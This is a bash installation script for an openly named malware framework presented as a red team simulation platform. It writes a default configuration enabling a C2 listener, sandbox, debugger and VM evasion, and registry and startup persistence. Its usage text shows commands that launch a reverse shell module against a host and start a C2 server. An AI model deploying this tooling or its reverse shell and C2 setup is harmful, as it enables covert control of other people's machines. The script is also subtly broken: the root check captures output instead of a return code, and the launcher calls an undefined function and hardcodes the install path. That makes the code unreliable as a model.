#!/bin/bash

# Malware Framework Installation Script
# Advanced Red Team Simulation Platform

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Installation paths
INSTALL_DIR="/opt/malware_framework"
BIN_DIR="/usr/local/bin"
SCRIPT_NAME="malware-framework"

# Function to print colored output
print_status() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

print_info() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_banner() {
    echo -e "${BLUE}"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════╗
║                    Malware Framework                         ║
║              Advanced Red Team Simulation Platform           ║
║                                                              ║
║  ⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY ⚠️          ║
╚══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# Function to check if running as root
check_root() {
    if [[ $EUID -eq 0 ]]; then
        print_info "Running as root - performing system-wide installation"
        return 0
    else
        print_warning "Not running as root - performing user installation"
        return 1
    fi
}

# Function to check Python version
check_python() {
    print_info "Checking Python installation..."
    
    if command -v python3 &> /dev/null; then
        PYTHON_VERSION=$(python3 -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')")
        print_status "Python $PYTHON_VERSION found"
        
        # Check minimum version
        if python3 -c "import sys; exit(0 if sys.version_info >= (3, 8) else 1)"; then
            print_status "Python version is compatible"
        else
            print_error "Python 3.8+ is required"
            exit 1
        fi
    else
        print_error "Python 3 is not installed"
        print_info "Please install Python 3.8+ and try again"
        exit 1
    fi
}

# Function to install system dependencies
install_system_deps() {
    print_info "Installing system dependencies..."
    
    if command -v apt-get &> /dev/null; then
        # Debian/Ubuntu
        sudo apt-get update
        sudo apt-get install -y python3-pip python3-venv build-essential git curl wget
    elif command -v yum &> /dev/null; then
        # CentOS/RHEL
        sudo yum install -y python3-pip python3-devel gcc git curl wget
    elif command -v dnf &> /dev/null; then
        # Fedora
        sudo dnf install -y python3-pip python3-devel gcc git curl wget
    elif command -v pacman &> /dev/null; then
        # Arch Linux
        sudo pacman -S --noconfirm python-pip python-virtualenv base-devel git curl wget
    else
        print_warning "Could not detect package manager - please install dependencies manually"
    fi
}

# Function to create virtual environment
create_venv() {
    print_info "Creating virtual environment..."
    
    if [[ -d "venv" ]]; then
        print_warning "Virtual environment already exists"
        read -p "Remove existing virtual environment? (y/N): " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            rm -rf venv
        else
            print_info "Using existing virtual environment"
            return
        fi
    fi
    
    python3 -m venv venv
    print_status "Virtual environment created"
}

# Function to install Python dependencies
install_python_deps() {
    print_info "Installing Python dependencies..."
    
    source venv/bin/activate
    
    # Upgrade pip
    pip install --upgrade pip
    
    # Install requirements
    if [[ -f "requirements.txt" ]]; then
        pip install -r requirements.txt
        print_status "Python dependencies installed"
    else
        print_error "requirements.txt not found"
        exit 1
    fi
    
    deactivate
}

# Function to create launcher script
create_launcher() {
    print_info "Creating launcher script..."
    
    LAUNCHER_SCRIPT="$BIN_DIR/$SCRIPT_NAME"
    
    cat > "$LAUNCHER_SCRIPT" << 'EOF'
#!/bin/bash

# Malware Framework Launcher
# Advanced Red Team Simulation Platform

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Framework directory
FRAMEWORK_DIR="/opt/malware_framework"

# Function to print colored output
print_status() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

# Function to check if framework is installed
check_installation() {
    if [[ ! -d "$FRAMEWORK_DIR" ]]; then
        print_error "Malware Framework is not installed"
        print_info "Please run the installation script first"
        exit 1
    fi
}

# Function to activate virtual environment
activate_venv() {
    if [[ -f "$FRAMEWORK_DIR/venv/bin/activate" ]]; then
        source "$FRAMEWORK_DIR/venv/bin/activate"
        return 0
    else
        print_warning "Virtual environment not found"
        return 1
    fi
}

# Function to run framework
run_framework() {
    check_installation
    
    cd "$FRAMEWORK_DIR"
    
    if activate_venv; then
        python main.py "$@"
    else
        python3 main.py "$@"
    fi
}

# Main execution
run_framework "$@"
EOF
    
    chmod +x "$LAUNCHER_SCRIPT"
    print_status "Launcher script created: $LAUNCHER_SCRIPT"
}

# Function to setup framework
setup_framework() {
    print_info "Setting up framework..."
    
    # Create necessary directories
    mkdir -p logs build downloads config data
    
    # Create default configuration
    if [[ ! -f "config/default.yaml" ]]; then
        cat > "config/default.yaml" << 'EOF'
framework:
  name: "Malware Framework"
  version: "1.0.0"
  debug: false
  stealth_mode: true

c2:
  protocol: "tcp"
  host: "0.0.0.0"
  port: 4444
  encryption:
    enabled: true
    algorithm: "aes"
    key: null

stealth:
  sandbox_detection: true
  debugger_detection: true
  vm_detection: true
  delay_jitter: 0.3

persistence:
  enabled: true
  methods: ["registry", "startup"]
  cleanup: false

logging:
  level: "INFO"
  file: "logs/framework.log"
  max_size: "10MB"
  backup_count: 5
EOF
        print_status "Default configuration created"
    fi
    
    # Set permissions
    chmod -R 755 .
    print_status "Framework setup completed"
}

# Function to test installation
test_installation() {
    print_info "Testing installation..."
    
    # Test launcher script
    if command -v "$SCRIPT_NAME" &> /dev/null; then
        print_status "Launcher script is accessible"
    else
        print_error "Launcher script not found in PATH"
        return 1
    fi
    
    # Test framework
    cd "$INSTALL_DIR"
    source venv/bin/activate
    
    if python -c "import sys; sys.path.insert(0, '.'); from core.base_payload import BasePayload; print('Framework imports working')" 2>/dev/null; then
        print_status "Framework imports working"
    else
        print_error "Framework imports failed"
        return 1
    fi
    
    deactivate
    print_status "Installation test completed"
}

# Function to show usage
show_usage() {
    print_info "Installation completed successfully!"
    echo
    echo "Usage:"
    echo "  $SCRIPT_NAME --help                    # Show help"
    echo "  $SCRIPT_NAME --list-modules            # List available modules"
    echo "  $SCRIPT_NAME --module reverse_shell    # Run reverse shell module"
    echo "  $SCRIPT_NAME --c2-server               # Start C2 server"
    echo "  $SCRIPT_NAME --interactive             # Start interactive mode"
    echo
    echo "Examples:"
    echo "  $SCRIPT_NAME --module reverse_shell --host 192.168.1.100 --port 4444"
    echo "  $SCRIPT_NAME --c2-server --port 4444"
    echo "  $SCRIPT_NAME --interactive"
    echo
    print_warning "⚠️  Remember: This framework is for educational and authorized testing only!"
}

# Main installation function
main() {
    print_banner
    
    # Check if running as root
    IS_ROOT=$(check_root)
    
    # Check Python
    check_python
    
    # Install system dependencies
    if [[ $IS_ROOT -eq 0 ]]; then
        install_system_deps
    fi
    
    # Create installation directory
    if [[ $IS_ROOT -eq 0 ]]; then
        sudo mkdir -p "$INSTALL_DIR"
        sudo chown "$USER:$USER" "$INSTALL_DIR"
    else
        mkdir -p "$HOME/.local/malware_framework"
        INSTALL_DIR="$HOME/.local/malware_framework"
        BIN_DIR="$HOME/.local/bin"
    fi
    
    # Copy framework files
    print_info "Copying framework files..."
    cp -r . "$INSTALL_DIR/"
    cd "$INSTALL_DIR"
    
    # Create virtual environment
    create_venv
    
    # Install Python dependencies
    install_python_deps
    
    # Setup framework
    setup_framework
    
    # Create launcher script
    create_launcher
    
    # Test installation
    if test_installation; then
        show_usage
    else
        print_error "Installation test failed"
        exit 1
    fi
}

# Run main function
main "$@" 